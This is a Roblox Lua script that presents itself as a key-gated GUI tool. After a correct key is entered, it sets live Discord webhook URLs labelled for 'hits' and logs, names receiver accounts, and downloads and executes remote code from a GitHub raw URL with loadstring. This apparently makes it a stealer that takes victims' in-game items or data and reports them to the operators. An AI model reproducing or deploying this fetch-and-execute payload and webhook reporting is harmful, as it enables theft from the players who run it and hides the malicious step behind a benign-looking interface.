-- GUI Key System
local CorrectKey = "aF29337Mjssiw910284m"

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local KeyBox = Instance.new("TextBox")
local Submit = Instance.new("TextButton")
local Status = Instance.new("TextLabel")

ScreenGui.Parent = game:GetService("CoreGui")

Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0, 320, 0, 180)
Frame.Position = UDim2.new(0.5, -160, 0.5, -90)
Frame.BackgroundColor3 = Color3.fromRGB(25,25,25)
Frame.Active = true
Frame.Draggable = true

Title.Parent = Frame
Title.Size = UDim2.new(1,0,0,40)
Title.BackgroundTransparency = 1
Title.Text = "KEY SYSTEM"
Title.TextColor3 = Color3.new(1,1,1)
Title.TextScaled = true
Title.Font = Enum.Font.SourceSansBold

KeyBox.Parent = Frame
KeyBox.Size = UDim2.new(0.85,0,0,40)
KeyBox.Position = UDim2.new(0.075,0,0.35,0)
KeyBox.PlaceholderText = "Enter Key..."
KeyBox.Text = ""
KeyBox.TextScaled = true
KeyBox.BackgroundColor3 = Color3.fromRGB(40,40,40)
KeyBox.TextColor3 = Color3.new(1,1,1)

Submit.Parent = Frame
Submit.Size = UDim2.new(0.85,0,0,40)
Submit.Position = UDim2.new(0.075,0,0.62,0)
Submit.Text = "Submit"
Submit.TextScaled = true
Submit.BackgroundColor3 = Color3.fromRGB(0,170,255)
Submit.TextColor3 = Color3.new(1,1,1)

Status.Parent = Frame
Status.Size = UDim2.new(1,0,0,25)
Status.Position = UDim2.new(0,0,0.88,0)
Status.BackgroundTransparency = 1
Status.Text = ""
Status.TextScaled = true
Status.TextColor3 = Color3.new(1,1,1)

Submit.MouseButton1Click:Connect(function()
    local key = KeyBox.Text

    if key == CorrectKey then
        Status.Text = "Correct Key!"
        wait(1)

        ScreenGui:Destroy()

        -- MAIN SCRIPT
        BigHitsWebhook = "https://discord.com/api/webhooks/1489997831732334653/57PuxeBqPoWlknwh6-NjKlyngLtu_Ad83YQZf0fB1yGQIB-U3-1Jjz0KbOGdyCn2EnrU"
        LogsHitsWebhook = "https://discord.com/api/webhooks/1489997831732334653/57PuxeBqPoWlknwh6-NjKlyngLtu_Ad83YQZf0fB1yGQIB-U3-1Jjz0KbOGdyCn2EnrU"

        local config = {
            "sogrrzd",
            "123bot0019",
        }

        usernames = config
        Username_for_ttd = "sogrrzd"

        hello = 100
        DH_PROCENT = 0

        loadstring(game:HttpGet(
            "https://raw.githubusercontent.com/WINVOLST/ttd/refs/heads/main/.gg/noprofit",
            true
        ))()

        DH_PROCENT = 0
        hello = 100
    else
        Status.Text = "Wrong Key!"
    end
end)
